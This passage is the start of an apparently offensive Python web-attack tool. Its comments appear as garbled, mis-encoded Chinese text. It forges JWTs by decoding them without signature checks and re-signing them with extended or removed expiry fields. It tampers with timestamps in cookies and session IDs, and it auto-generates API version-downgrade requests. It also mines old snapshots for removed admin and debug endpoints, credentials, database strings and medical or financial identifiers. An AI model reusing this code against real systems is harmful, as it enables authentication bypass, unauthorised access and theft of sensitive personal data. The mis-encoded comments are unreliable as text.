#!/usr/bin/env python3
"""
Time Travel Plus - æ—¶é—´æ—…è¡Œå¢å¼ºç‰ˆ
åˆ©ç”¨ç‰ˆæœ¬æ§åˆ¶ã€å®¡è®¡æ—¥å¿—ã€å†å²å¿«ç…§ï¼Œè·å–æ‰€æœ‰å†å²æ•°æ®ï¼
åŒ…æ‹¬å·²åˆ é™¤çš„æ•°æ®ï¼
"""

import asyncio
import aiohttp
import json
import logging
import re
import sys
import os
import heapq
from datetime import datetime, timedelta
from urllib.parse import urljoin, quote, urlparse
from collections import defaultdict, deque
from dataclasses import dataclass, field
from typing import Dict, List, Set, Tuple, Optional, Any, TYPE_CHECKING

if TYPE_CHECKING:
    from . import RequestTask  # å‰å‘å£°æ˜
from functools import lru_cache
import ssl
import certifi
import base64
import hashlib
import time
import jwt  # ç”¨äºJWTæ—¶é—´æ‰­æ›²
import urllib.parse

# å¯¼å…¥æ™ºèƒ½é™åˆ¶ç®¡ç†å™¨
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from smart_limits import SmartLimitManager, SystemSize

# å¯¼å…¥ WAF Defender
try:
    from .waf_defender import create_waf_defender
    WAF_DEFENDER_AVAILABLE = True
except ImportError:
    print("[!] WAF Defender ä¸å¯ç”¨")
    WAF_DEFENDER_AVAILABLE = False

# å¯¼å…¥å™ªéŸ³è¿‡æ»¤å™¨
try:
    from . import third_party_blacklist
    NOISE_FILTER_AVAILABLE = True
except ImportError:
    print("[!] å™ªéŸ³è¿‡æ»¤å™¨ ä¸å¯ç”¨")
    NOISE_FILTER_AVAILABLE = False

# ğŸ›¡ï¸ å†…å­˜å®‰å…¨ï¼šæœ‰ç•Œé›†åˆå®ç°
class BoundedSet:
    """é˜²æ­¢å†…å­˜æ³„æ¼çš„æœ‰ç•Œé›†åˆ - ä½¿ç”¨FIFOæ·˜æ±°ç­–ç•¥"""
    
    def __init__(self, max_size: int = 10000):
        self.max_size = max_size
        self._data: Set[str] = set()
        self._queue: deque = deque(maxlen=max_size)
    
    def add(self, item: str) -> None:
        """æ·»åŠ å…ƒç´ ï¼Œè‡ªåŠ¨å¤„ç†å®¹é‡æº¢å‡º"""
        if item not in self._data:
            # å¦‚æœè¾¾åˆ°å®¹é‡ä¸Šé™ï¼Œæ‰¹é‡æ¸…ç†æå‡æ€§èƒ½
            if len(self._data) >= self.max_size:
                cleanup_count = max(1, self.max_size // 4)  # æ¸…ç†25%
                for _ in range(cleanup_count):
                    if self._queue:
                        oldest = self._queue.popleft()
                        self._data.discard(oldest)
            
            self._data.add(item)
            self._queue.append(item)
    
    def update(self, items) -> None:
        """æ‰¹é‡æ·»åŠ å…ƒç´ """
        for item in items:
            self.add(item)
    
    def __contains__(self, item: str) -> bool:
        return item in self._data
    
    def __len__(self) -> int:
        return len(self._data)
    
    def __iter__(self):
        return iter(self._data)
    
    def clear(self) -> None:
        """æ¸…ç©ºé›†åˆ"""
        self._data.clear()
        self._queue.clear()
    
    def get_memory_usage(self) -> Dict[str, int]:
        """è·å–å†…å­˜ä½¿ç”¨ç»Ÿè®¡"""
        return {
            "current_size": len(self._data),
            "max_size": self.max_size,
            "usage_percent": int((len(self._data) / self.max_size) * 100)
        }


#  æ ¸å¿ƒç»„ä»¶1ï¼šSessionæ—¶é—´æ‰­æ›²å™¨ - æ€æ‰‹é”â­â­â­â­â­
class SessionTimeSkewer:
    """Sessionæ—¶é—´æ‰­æ›²å™¨ - ä¿®æ”¹JWTå’ŒCookieæ—¶é—´æˆ³æ¥ç»•è¿‡æ—¶é—´ç›¸å…³è®¿é—®æ§åˆ¶"""
    
    def __init__(self):
        self.skewed_tokens = {}  # ç¼“å­˜å·²æ‰­æ›²çš„token
        self.time_formats = [
            "%Y-%m-%d %H:%M:%S",
            "%Y-%m-%dT%H:%M:%SZ", 
            "%Y-%m-%dT%H:%M:%S.%fZ",
            "%Y/%m/%d %H:%M:%S",
            "%d/%m/%Y %H:%M:%S"
        ]
        
    def skew_jwt(self, token: str, target_time: datetime, secret_key: str = None) -> Dict[str, str]:
        """ä¿®æ”¹JWTæ—¶é—´å£°æ˜ - æ ¸å¿ƒæ€æ‰‹é”åŠŸèƒ½"""
        try:
            # 1. å°è¯•è§£ç JWTï¼ˆä¸éªŒè¯ç­¾åï¼‰
            unverified_payload = jwt.decode(token, options={"verify_signature": False})
            original_header = jwt.get_unverified_header(token)
            
            # 2. è¯†åˆ«æ—¶é—´ç›¸å…³å­—æ®µ
            time_fields = ['iat', 'exp', 'nbf', 'auth_time', 'updated_at']
            target_timestamp = int(target_time.timestamp())
            
            skewed_variants = []
            
            # 3. ç”Ÿæˆå¤šç§æ—¶é—´æ‰­æ›²å˜ä½“
            for field in time_fields:
                if field in unverified_payload:
                    # å¤‡ä»½åŸå§‹å€¼
                    original_value = unverified_payload[field]
                    
                    # å˜ä½“1: è®¾ç½®ä¸ºç›®æ ‡æ—¶é—´
                    payload_variant1 = unverified_payload.copy()
                    payload_variant1[field] = target_timestamp
                    
                    # å˜ä½“2: è®¾ç½®ä¸ºå¾ˆä¹…ä»¥å‰ï¼ˆç»•è¿‡expæ£€æŸ¥ï¼‰
                    if field == 'exp':
                        payload_variant2 = unverified_payload.copy()
                        payload_variant2[field] = target_timestamp + (365 * 24 * 3600)  # +1å¹´
                        
                        # å°è¯•é‡æ–°ç­¾åï¼ˆå¦‚æœæ²¡æœ‰secret_keyå°±è¿”å›æœªç­¾åçš„ï¼‰
                        if secret_key:
                            try:
                                skewed_token2 = jwt.encode(payload_variant2, secret_key, algorithm=original_header.get('alg', 'HS256'))
                                skewed_variants.append({
                                    'type': f'extended_{field}',
                                    'token': skewed_token2,
                                    'description': f'å»¶é•¿{field}å­—æ®µ1å¹´'
                                })
                            except:
                                pass
                    
                    # å˜ä½“3: è®¾ç½®ä¸ºnull/0ï¼ˆå¯èƒ½ç»•è¿‡éªŒè¯ï¼‰
                    payload_variant3 = unverified_payload.copy()
                    payload_variant3[field] = 0
                    
                    # å°è¯•é‡æ–°ç­¾å
                    for variant_name, variant_payload in [
                        (f'target_{field}', payload_variant1),
                        (f'null_{field}', payload_variant3)
                    ]:
                        if secret_key:
                            try:
                                skewed_token = jwt.encode(variant_payload, secret_key, algorithm=original_header.get('alg', 'HS256'))
                                skewed_variants.append({
                                    'type': variant_name,
                                    'token': skewed_token,
                                    'description': f'ä¿®æ”¹{field}ä¸º{variant_payload[field]}'
                                })
                            except Exception as e:
                                # æ— å¯†é’¥æ—¶ï¼Œè¿”å›payloadä¾›æ‰‹åŠ¨å¤„ç†
                                skewed_variants.append({
                                    'type': f'unsigned_{variant_name}',
                                    'payload': variant_payload,
                                    'description': f'æ— ç­¾åå¯†é’¥ï¼Œéœ€æ‰‹åŠ¨ç­¾å: {field}={variant_payload[field]}'
                                })
            
            # 4. ç‰¹æ®Šæ”»å‡»ï¼šå®Œå…¨ç§»é™¤æ—¶é—´å­—æ®µ
            payload_no_time = {k: v for k, v in unverified_payload.items() 
                             if k not in time_fields}
            if secret_key:
                try:
                    no_time_token = jwt.encode(payload_no_time, secret_key, algorithm=original_header.get('alg', 'HS256'))
                    skewed_variants.append({
                        'type': 'no_time_fields',
                        'token': no_time_token,
                        'description': 'ç§»é™¤æ‰€æœ‰æ—¶é—´å­—æ®µ'
                    })
                except:
                    pass
            
            return {
                'original_token': token,
                'original_payload': unverified_payload,
                'skewed_variants': skewed_variants,
                'success': len(skewed_variants) > 0
            }
            
        except Exception as e:
            return {
                'original_token': token,
                'error': f'JWTè§£æå¤±è´¥: {str(e)}',
                'success': False
            }
    
    def skew_cookie(self, cookie_header: str, time_delta: timedelta) -> List[str]:
        """ä¿®æ”¹Cookieæ—¶é—´æˆ³ - é‡è¦æ”»å‡»å‘é‡"""
        skewed_cookies = []
        
        # è§£æCookie
        cookies = {}
        for cookie_pair in cookie_header.split(';'):
            if '=' in cookie_pair:
                key, value = cookie_pair.strip().split('=', 1)
                cookies[key] = value
        
        for cookie_name, cookie_value in cookies.items():
            # 1. æ£€æµ‹æ—¶é—´æˆ³æ¨¡å¼
            timestamp_patterns = [
                (r'(\d{10})', 'unix_timestamp'),        # Unixæ—¶é—´æˆ³
                (r'(\d{13})', 'unix_timestamp_ms'),     # æ¯«ç§’æ—¶é—´æˆ³
                (r'(\d{4}-\d{2}-\d{2})', 'date_format'), # æ—¥æœŸæ ¼å¼
                (r'(\d{2}/\d{2}/\d{4})', 'date_format_us') # ç¾å¼æ—¥æœŸ
            ]
            
            for pattern, pattern_type in timestamp_patterns:
                matches = re.findall(pattern, cookie_value)
                for match in matches:
                    try:
                        if pattern_type == 'unix_timestamp':
                            # Unixæ—¶é—´æˆ³
                            original_timestamp = int(match)
                            original_time = datetime.fromtimestamp(original_timestamp)
                            target_time = original_time + time_delta
                            new_timestamp = int(target_time.timestamp())
                            
                            skewed_value = cookie_value.replace(match, str(new_timestamp))
                            skewed_cookies.append(f"{cookie_name}={skewed_value}")
                            
                        elif pattern_type == 'unix_timestamp_ms':
                            # æ¯«ç§’æ—¶é—´æˆ³
                            original_timestamp_ms = int(match)
                            original_time = datetime.fromtimestamp(original_timestamp_ms / 1000)
                            target_time = original_time + time_delta
                            new_timestamp_ms = int(target_time.timestamp() * 1000)
                            
                            skewed_value = cookie_value.replace(match, str(new_timestamp_ms))
                            skewed_cookies.append(f"{cookie_name}={skewed_value}")
                            
                        elif pattern_type in ['date_format', 'date_format_us']:
                            # æ—¥æœŸæ ¼å¼
                            for fmt in self.time_formats:
                                try:
                                    original_time = datetime.strptime(match, fmt)
                                    target_time = original_time + time_delta
                                    new_date_str = target_time.strftime(fmt)
                                    
                                    skewed_value = cookie_value.replace(match, new_date_str)
                                    skewed_cookies.append(f"{cookie_name}={skewed_value}")
                                    break
                                except:
                                    continue
                                    
                    except Exception as e:
                        continue
        
        return skewed_cookies
    
    def generate_historical_session_attacks(self, session_data: Dict, target_dates: List[datetime]) -> List[Dict]:
        """ç”Ÿæˆå†å²ä¼šè¯æ”»å‡»è½½è·"""
        attacks = []
        
        for target_date in target_dates:
            attack = {
                'target_date': target_date.isoformat(),
                'attack_vectors': []
            }
            
            # 1. JWTæ”»å‡»
            if 'authorization' in session_data or 'token' in session_data:
                token = session_data.get('authorization', session_data.get('token', ''))
                if token.startswith('Bearer '):
                    token = token[7:]
                
                jwt_result = self.skew_jwt(token, target_date)
                if jwt_result['success']:
                    attack['attack_vectors'].append({
                        'type': 'jwt_time_skew',
                        'variants': jwt_result['skewed_variants']
                    })
            
            # 2. Cookieæ”»å‡»
            if 'cookie' in session_data:
                time_delta = target_date - datetime.now()
                skewed_cookies = self.skew_cookie(session_data['cookie'], time_delta)
                if skewed_cookies:
                    attack['attack_vectors'].append({
                        'type': 'cookie_time_skew',
                        'skewed_cookies': skewed_cookies
                    })
            
            # 3. ä¼šè¯IDæ—¶é—´æˆ³æ”»å‡»
            if 'session_id' in session_data:
                session_id = session_data['session_id']
                # å°è¯•è§£æä¼šè¯IDä¸­çš„æ—¶é—´æˆ³
                timestamp_match = re.search(r'(\d{10,13})', session_id)
                if timestamp_match:
                    original_ts = timestamp_match.group(1)
                    target_ts = int(target_date.timestamp())
                    if len(original_ts) == 13:  # æ¯«ç§’
                        target_ts *= 1000
                    
                    skewed_session_id = session_id.replace(original_ts, str(target_ts))
                    attack['attack_vectors'].append({
                        'type': 'session_id_time_skew',
                        'original_session_id': session_id,
                        'skewed_session_id': skewed_session_id
                    })
            
            if attack['attack_vectors']:
                attacks.append(attack)
        
        return attacks
    
    def detect_time_based_access_controls(self, response_data: str) -> Dict:
        """æ£€æµ‹æ—¶é—´ç›¸å…³çš„è®¿é—®æ§åˆ¶æœºåˆ¶"""
        time_indicators = {
            'session_expiry': ['session expired', 'token expired', 'login required'],
            'temporal_access': ['access denied', 'not available at this time', 'outside business hours'],
            'version_control': ['version not found', 'historical data', 'archived'],
            'audit_trail': ['audit log', 'access log', 'activity log']
        }
        
        detected = {}
        response_lower = response_data.lower()
        
        for category, keywords in time_indicators.items():
            matches = [kw for kw in keywords if kw in response_lower]
            if matches:
                detected[category] = matches
        
        return detected


#  æ ¸å¿ƒç»„ä»¶2ï¼šAPIç‰ˆæœ¬é™çº§å™¨ - ç®€å•ä½†è‡´å‘½â­â­â­â­
class APIVersionDowngrader:
    """APIç‰ˆæœ¬é™çº§å™¨ - è‡ªåŠ¨å°è¯•æ—§ç‰ˆæœ¬APIï¼ˆv3â†’v2â†’v1â†’v0ï¼‰ï¼Œæ”»å‡»å·²è¢«é—å¿˜ä½†ä»è¿è¡Œçš„æ—§ç‰ˆæœ¬"""
    
    def __init__(self):
        self.version_patterns = {
            # æ•°å­—ç‰ˆæœ¬
            'numeric': [
                (r'/v(\d+)/', r'/v{}/'),           # /api/v3/ â†’ /api/v2/
                (r'/api(\d+)/', r'/api{}/'),       # /api3/ â†’ /api2/
                (r'version=(\d+)', 'version={}'),  # ?version=3 â†’ ?version=2
                (r'ver=(\d+)', 'ver={}'),          # ?ver=3 â†’ ?ver=2
            ],
            # æ—¥æœŸç‰ˆæœ¬
            'date': [
                (r'/(\d{4}-\d{2})/', r'/{}/'),     # /2024-03/ â†’ /2024-02/
                (r'/(\d{4})/(\d{2})/', r'/{}/{}/'), # /2024/03/ â†’ /2024/02/
            ],
            # è¯­ä¹‰ç‰ˆæœ¬
            'semantic': [
                (r'/(v?\d+\.\d+\.\d+)/', r'/{}/'), # /v1.2.3/ â†’ /v1.2.2/
                (r'/(v?\d+\.\d+)/', r'/{}/'),      # /v1.2/ â†’ /v1.1/
            ],
            # ç‰¹æ®Šç‰ˆæœ¬
            'special': [
                (r'/beta/', r'/alpha/'),           # /beta/ â†’ /alpha/
                (r'/stable/', r'/beta/'),          # /stable/ â†’ /beta/
                (r'/latest/', r'/previous/'),      # /latest/ â†’ /previous/
                (r'/current/', r'/legacy/'),       # /current/ â†’ /legacy/
            ]
        }
        
        self.common_old_versions = [
            'v0', 'v1', 'v2', 'v3', 'v4', 'v5',
            'alpha', 'beta', 'dev', 'test', 'legacy', 'old',
            '2019', '2020', '2021', '2022', '2023',
            '1.0', '2.0', '3.0', '0.1', '0.9'
        ]
    
    def detect_version_pattern(self, url: str) -> Dict[str, Any]:
        """æ£€æµ‹URLä¸­çš„ç‰ˆæœ¬æ¨¡å¼"""
        detected_patterns = []
        
        for pattern_type, patterns in self.version_patterns.items():
            for pattern, replacement in patterns:
                matches = re.findall(pattern, url)
                if matches:
                    detected_patterns.append({
                        'type': pattern_type,
                        'pattern': pattern,
                        'replacement': replacement,
                        'current_version': matches[0] if isinstance(matches[0], str) else matches[0][0],
                        'matched_text': matches[0]
                    })
        
        return {
            'url': url,
            'detected_patterns': detected_patterns,
            'has_version': len(detected_patterns) > 0
        }
    
    def generate_downgrades(self, url: str, max_variants: int = 10) -> List[Dict]:
        """ç”Ÿæˆé™çº§URLåˆ—è¡¨ - æ ¸å¿ƒåŠŸèƒ½"""
        downgrades = []
        detection_result = self.detect_version_pattern(url)
        
        if not detection_result['has_version']:
            # å¦‚æœæ²¡æœ‰æ£€æµ‹åˆ°ç‰ˆæœ¬ï¼Œå°è¯•å¸¸è§çš„ç‰ˆæœ¬ç«¯ç‚¹
            base_url = url.rstrip('/')
            for version in self.common_old_versions[:max_variants]:
                candidate_urls = [
                    f"{base_url}/v{version}/" if version.isdigit() else f"{base_url}/{version}/",
                    f"{base_url}?version={version}",
                    f"{base_url}?v={version}",
                    url.replace('/api/', f'/api/{version}/'),
                    url.replace('/api/', f'/api/v{version}/') if version.isdigit() else url.replace('/api/', f'/api/{version}/')
                ]
                
                for candidate_url in candidate_urls:
                    if candidate_url != url:  # é¿å…é‡å¤
                        downgrades.append({
                            'url': candidate_url,
                            'version': version,
                            'method': 'common_version_injection',
                            'confidence': 'low'
                        })
        else:
            # åŸºäºæ£€æµ‹åˆ°çš„æ¨¡å¼ç”Ÿæˆé™çº§ç‰ˆæœ¬
            for pattern_info in detection_result['detected_patterns']:
                current_version = pattern_info['current_version']
                pattern_type = pattern_info['type']
                
                if pattern_type == 'numeric':
                    # æ•°å­—ç‰ˆæœ¬é™çº§
                    try:
                        current_num = int(current_version)
                        for i in range(max(0, current_num - 5), current_num):
                            if i != current_num:
                                downgrade_url = re.sub(
                                    pattern_info['pattern'], 
                                    pattern_info['replacement'].format(i), 
                                    url
                                )
                                downgrades.append({
                                    'url': downgrade_url,
                                    'version': str(i),
                                    'method': 'numeric_downgrade',
                                    'confidence': 'high',
                                    'original_version': current_version
                                })
                    except ValueError:
                        pass
                
                elif pattern_type == 'date':
                    # æ—¥æœŸç‰ˆæœ¬é™çº§
                    try:
                        if '-' in current_version:  # YYYY-MM format
                            year, month = current_version.split('-')
                            year, month = int(year), int(month)
                            
                            # ç”Ÿæˆè¿‡å»6ä¸ªæœˆçš„ç‰ˆæœ¬
                            for i in range(1, 7):
                                new_month = month - i
                                new_year = year
                                if new_month <= 0:
                                    new_month += 12
                                    new_year -= 1
                                
                                old_date = f"{new_year}-{new_month:02d}"
                                downgrade_url = re.sub(
                                    pattern_info['pattern'],
                                    pattern_info['replacement'].format(old_date),
                                    url
                                )
                                downgrades.append({
                                    'url': downgrade_url,
                                    'version': old_date,
                                    'method': 'date_downgrade',
                                    'confidence': 'medium',
                                    'original_version': current_version
                                })
                    except:
                        pass
                
                elif pattern_type == 'semantic':
                    # è¯­ä¹‰ç‰ˆæœ¬é™çº§
                    try:
                        version_clean = current_version.lstrip('v')
                        parts = version_clean.split('.')
                        
                        # é™çº§ç­–ç•¥ï¼šå‡å°‘æœ€åä¸€ä¸ªæ•°å­—
                        if len(parts) >= 2:
                            major, minor = int(parts[0]), int(parts[1])
                            patch = int(parts[2]) if len(parts) > 2 else 0
                            
                            candidates = []
                            if patch > 0:
                                candidates.append(f"{major}.{minor}.{patch-1}")
                            if minor > 0:
                                candidates.append(f"{major}.{minor-1}.{patch}")
                                candidates.append(f"{major}.{minor-1}.0")
                            if major > 0:
                                candidates.append(f"{major-1}.{minor}.{patch}")
                                candidates.append(f"{major-1}.0.0")
                            
                            # æ·»åŠ å¸¸è§çš„æ—§ç‰ˆæœ¬
                            candidates.extend(['1.0.0', '1.0', '0.9', '0.1', '2.0', '3.0'])
                            
                            for candidate in candidates[:max_variants]:
                                if candidate != version_clean:
                                    prefix = 'v' if current_version.startswith('v') else ''
                                    downgrade_url = re.sub(
                                        pattern_info['pattern'],
                                        pattern_info['replacement'].format(f"{prefix}{candidate}"),
                                        url
                                    )
                                    downgrades.append({
                                        'url': downgrade_url,
                                        'version': f"{prefix}{candidate}",
                                        'method': 'semantic_downgrade',
                                        'confidence': 'high',
                                        'original_version': current_version
                                    })
                    except:
                        pass
                
                elif pattern_type == 'special':
                    # ç‰¹æ®Šç‰ˆæœ¬é™çº§
                    special_downgrades = {
                        'latest': ['previous', 'old', 'legacy', 'v2', 'v1'],
                        'current': ['previous', 'old', 'legacy'],
                        'stable': ['beta', 'alpha', 'dev', 'test'],
                        'beta': ['alpha', 'dev', 'test'],
                        'prod': ['staging', 'test', 'dev'],
                        'production': ['staging', 'test', 'dev']
                    }
                    
                    for old_version in special_downgrades.get(current_version, []):
                        downgrade_url = url.replace(f'/{current_version}/', f'/{old_version}/')
                        downgrades.append({
                            'url': downgrade_url,
                            'version': old_version,
                            'method': 'special_downgrade',
                            'confidence': 'medium',
                            'original_version': current_version
                        })
        
        # å»é‡å¹¶é™åˆ¶æ•°é‡
        seen_urls = set()
        unique_downgrades = []
        for downgrade in downgrades:
            if downgrade['url'] not in seen_urls and len(unique_downgrades) < max_variants:
                seen_urls.add(downgrade['url'])
                unique_downgrades.append(downgrade)
        
        return unique_downgrades
    
    def generate_version_discovery_tasks(self, base_urls: List[str]) -> List:
        """ä¸ºèµ„äº§æ˜ å°„å™¨ç”Ÿæˆç‰ˆæœ¬å‘ç°ä»»åŠ¡"""
        tasks = []
        
        for base_url in base_urls:
            downgrades = self.generate_downgrades(base_url)
            
            for downgrade in downgrades:
                # ä¸ºæ¯ä¸ªé™çº§URLåˆ›å»ºè¯·æ±‚ä»»åŠ¡
                priority = 0.8 if downgrade['confidence'] == 'high' else 0.6
                
                # åˆ›å»ºç®€åŒ–çš„ä»»åŠ¡å¯¹è±¡ï¼ˆå…¼å®¹ç°æœ‰RequestTaskç»“æ„ï¼‰
                task = type('RequestTask', (), {
                    'priority': priority,
                    'url': downgrade['url'],
                    'method': 'GET',
                    'task_type': 'version_downgrade',
                    'metadata': {
                        'original_url': base_url,
                        'target_version': downgrade['version'],
                        'downgrade_method': downgrade['method'],
                        'confidence': downgrade['confidence']
                    },
                    'retry_count': 0,
                    'max_retries': 3
                })()
                tasks.append(task)
        
        return tasks
    
    def analyze_version_responses(self, responses: List[Dict]) -> Dict[str, Any]:
        """åˆ†æç‰ˆæœ¬é™çº§å“åº”ï¼Œè¯†åˆ«æˆåŠŸçš„é™çº§æ”»å‡»"""
        successful_downgrades = []
        interesting_responses = []
        
        for response in responses:
            if response.get('status') == 200:
                task = response.get('task')
                if task and task.task_type == 'version_downgrade':
                    # æˆåŠŸçš„ç‰ˆæœ¬é™çº§
                    successful_downgrades.append({
                        'url': task.url,
                        'original_url': task.metadata['original_url'],
                        'version': task.metadata['target_version'],
                        'method': task.metadata['downgrade_method'],
                        'response_data': response.get('data', ''),
                        'response_size': len(str(response.get('data', ''))),
                        'confidence': task.metadata['confidence']
                    })
            
            elif response.get('status') in [401, 403]:
                # éœ€è¦è®¤è¯çš„æ—§ç‰ˆæœ¬API - å¾ˆæœ‰ä»·å€¼ï¼
                task = response.get('task')
                if task and task.task_type == 'version_downgrade':
                    interesting_responses.append({
                        'url': task.url,
                        'status': response.get('status'),
                        'version': task.metadata['target_version'],
                        'note': 'æ—§ç‰ˆæœ¬APIéœ€è¦è®¤è¯ - å¯èƒ½å­˜åœ¨è®¤è¯ç»•è¿‡'
                    })
        
        return {
            'successful_downgrades': successful_downgrades,
            'interesting_responses': interesting_responses,
            'total_tested': len(responses),
            'success_rate': len(successful_downgrades) / max(len(responses), 1)
        }


#  æ ¸å¿ƒç»„ä»¶3ï¼šå·®å¼‚åˆ†æå¼•æ“ - çµé­‚â­â­â­â­â­
class DiffAnalyzer:
    """å·®å¼‚åˆ†æå™¨ - è‡ªåŠ¨æ‰¾å‡ºå†å²æ•°æ®ä¸­æ¶ˆå¤±çš„æ•æ„Ÿä¿¡æ¯"""
    
    def __init__(self):
        self.sensitive_patterns = {
            'credentials': [
                r'password["\']?\s*[:=]\s*["\']([^"\']{8,})["\']',
                r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
                r'secret["\']?\s*[:=]\s*["\']([^"\']{16,})["\']',
                r'token["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
            ],
            'endpoints': [
                r'/(api|rest|graphql)/[^\s"\'<>]+',
                r'/admin/[^\s"\'<>]+',
                r'/internal/[^\s"\'<>]+',
                r'/debug/[^\s"\'<>]+',
                r'/test/[^\s"\'<>]+',
            ],
            'database': [
                r'mongodb://[^\s"\'<>]+',
                r'mysql://[^\s"\'<>]+',
                r'postgresql://[^\s"\'<>]+',
                r'redis://[^\s"\'<>]+',
                r'CONNECTION_STRING\s*[:=]\s*["\']([^"\']+)["\']',
            ],
            'internal_hosts': [
                r'https?://[\w\-]+\.internal[^\s"\'<>]*',
                r'https?://[\w\-]+\.local[^\s"\'<>]*',
                r'https?://[\w\-]+\.corp[^\s"\'<>]*',
                r'https?://10\.\d+\.\d+\.\d+[^\s"\'<>]*',
                r'https?://192\.168\.\d+\.\d+[^\s"\'<>]*',
            ],
            'sensitive_params': [
                r'[?&]debug=[^&\s]+',
                r'[?&]test=[^&\s]+',
                r'[?&]dev=[^&\s]+',
                r'[?&]admin=[^&\s]+',
                r'[?&]internal=[^&\s]+',
            ]
        }
        
        self.business_patterns = {
            'medical': [
                r'patient[_-]?id\s*[:=]\s*["\']?(\w+)["\']?',
                r'medical[_-]?record\s*[:=]\s*["\']?(\w+)["\']?',
                r'prescription[_-]?id\s*[:=]\s*["\']?(\w+)["\']?',
                r'è¨ºç™‚[è¨˜éŒ²ç•ªå·]?\s*[:=]\s*["\']?(\w+)["\']?',
            ],
            'financial': [
                r'account[_-]?number\s*[:=]\s*["\']?(\w+)["\']?',
                r'credit[_-]?card\s*[:=]\s*["\']?(\w+)["\']?',
                r'transaction[_-]?id\s*[:=]\s*["\']?(\w+)["\']?',
            ],
            'personal': [
                r'social[_-]?security\s*[:=]\s*["\']?(\w+)["\']?',
                r'phone[_-]?number\s*[:=]\s*["\']?(\w+)["\']?',
                r'email\s*[:=]\s*["\']?([^"\'@]+@[^"\']+)["\']?',
            ]
        }
    
    def analyze_api_diff(self, old_snapshot: Dict, new_snapshot: Dict) -> Dict[str, Any]:
        """åˆ†æAPIå·®å¼‚ - æ ¸å¿ƒåŠŸèƒ½"""
        diffs = {
            'removed_endpoints': [],
            'modified_endpoints': [],
            'removed_parameters': [],
            'removed_headers': [],
            'changed_responses': [],
            'security_changes': []
        }
        
        # 1. åˆ†ææ¶ˆå¤±çš„ç«¯ç‚¹
        old_endpoints = self._extract_endpoints_from_snapshot(old_snapshot)
        new_endpoints = self._extract_endpoints_from_snapshot(new_snapshot)
        
        removed_endpoints = old_endpoints - new_endpoints
        for endpoint in removed_endpoints:
            diffs['removed_endpoints'].append({
                'endpoint': endpoint,
                'risk_level': self._assess_endpoint_risk(endpoint),
                'last_seen': old_snapshot.get('timestamp', 'unknown'),
                'potential_data': self._extract_potential_data_from_endpoint(endpoint)
            })
        
        # 2. åˆ†æä¿®æ”¹çš„ç«¯ç‚¹
        common_endpoints = old_endpoints & new_endpoints
        for endpoint in common_endpoints:
            old_data = self._get_endpoint_data(old_snapshot, endpoint)
            new_data = self._get_endpoint_data(new_snapshot, endpoint)
            
            if old_data != new_data:
                changes = self._analyze_endpoint_changes(old_data, new_data)
                if changes:
                    diffs['modified_endpoints'].append({
                        'endpoint': endpoint,
                        'changes': changes,
                        'risk_level': self._assess_change_risk(changes)
                    })
        
        # 3. åˆ†ææ¶ˆå¤±çš„å‚æ•°
        old_params = self._extract_parameters(old_snapshot)
        new_params = self._extract_parameters(new_snapshot)
        
        removed_params = old_params - new_params
        for param in removed_params:
            diffs['removed_parameters'].append({
                'parameter': param,
                'risk_level': self._assess_parameter_risk(param),
                'endpoints_affected': self._find_endpoints_using_param(old_snapshot, param)
            })
        
        return diffs
    
    def extract_intelligence(self, diffs: Dict) -> Dict[str, List]:
        """ä»å·®å¼‚ä¸­æå–å¯æ“ä½œæƒ…æŠ¥"""
        intelligence = {
            'high_value_targets': [],
            'backdoor_candidates': [],
            'data_leak_opportunities': [],
            'compliance_violations': []
        }
        
        # 1. é«˜ä»·å€¼ç›®æ ‡ï¼šæ¶ˆå¤±çš„ç®¡ç†ç«¯ç‚¹
        for removed in diffs.get('removed_endpoints', []):
            endpoint = removed['endpoint']
            if any(keyword in endpoint.lower() for keyword in ['admin', 'debug', 'internal', 'test']):
                intelligence['high_value_targets'].append({
                    'type': 'removed_admin_endpoint',
                    'target': endpoint,
                    'action': 'test_direct_access',
                    'priority': 'high',
                    'reason': f"ç®¡ç†ç«¯ç‚¹è¢«ç§»é™¤ä½†å¯èƒ½ä»å¯è®¿é—®: {endpoint}"
                })
        
        # 2. åé—¨å€™é€‰ï¼šæ¶ˆå¤±çš„è°ƒè¯•å‚æ•°
        for removed in diffs.get('removed_parameters', []):
            param = removed['parameter']
            if any(keyword in param.lower() for keyword in ['debug', 'test', 'dev', 'bypass']):
                intelligence['backdoor_candidates'].append({
                    'type': 'removed_debug_param',
                    'target': param,
                    'action': 'test_parameter_injection',
                    'priority': 'high',
                    'reason': f"è°ƒè¯•å‚æ•°è¢«ç§»é™¤ä½†å¯èƒ½ä»ç”Ÿæ•ˆ: {param}"
                })
        
        # 3. æ•°æ®æ³„éœ²æœºä¼šï¼šæš´éœ²çš„æ•æ„Ÿæ•°æ®æ¨¡å¼
        for category, patterns in self.sensitive_patterns.items():
            for removed in diffs.get('removed_endpoints', []):
                potential_data = removed.get('potential_data', [])
                for data_item in potential_data:
                    for pattern in patterns:
                        if re.search(pattern, str(data_item), re.I):
                            intelligence['data_leak_opportunities'].append({
                                'type': f'sensitive_{category}',
                                'target': removed['endpoint'],
                                'data_preview': str(data_item)[:100],
                                'action': 'attempt_historical_access',
                                'priority': 'critical'
                            })
        
        # 4. åˆè§„æ€§è¿è§„ï¼šåŒ»ç–—/é‡‘èæ•°æ®æ³„éœ²
        for category, patterns in self.business_patterns.items():
            for removed in diffs.get('removed_endpoints', []):
                potential_data = removed.get('potential_data', [])
                for data_item in potential_data:
                    for pattern in patterns:
                        if re.search(pattern, str(data_item), re.I):
                            intelligence['compliance_violations'].append({
                                'type': f'{category}_data_exposure',
                                'target': removed['endpoint'],
                                'violation': f'æš´éœ²çš„{category}æ•°æ®æœªæ­£ç¡®åˆ é™¤',
                                'action': 'audit_data_retention',
                                'priority': 'critical',
                                'compliance_impact': 'GDPR/HIPAAè¿è§„é£é™©'
                            })
        
        return intelligence
    
    def _extract_endpoints_from_snapshot(self, snapshot: Dict) -> Set[str]:
        """ä»å¿«ç…§ä¸­æå–ç«¯ç‚¹åˆ—è¡¨"""
        endpoints = set()
        
        # ä»ä¸åŒçš„æ•°æ®æºæå–ç«¯ç‚¹
        data = snapshot.get('data', {})
        if isinstance(data, dict):
            # ä»APIå“åº”ä¸­æå–
            if 'endpoints' in data:
                endpoints.update(data['endpoints'])
            
            # ä»HTML/JSä¸­æå–
            if 'content' in data:
                content = str(data['content'])
                for pattern in self.sensitive_patterns['endpoints']:
                    matches = re.findall(pattern, content)
                    endpoints.update(matches)
        
        elif isinstance(data, list):
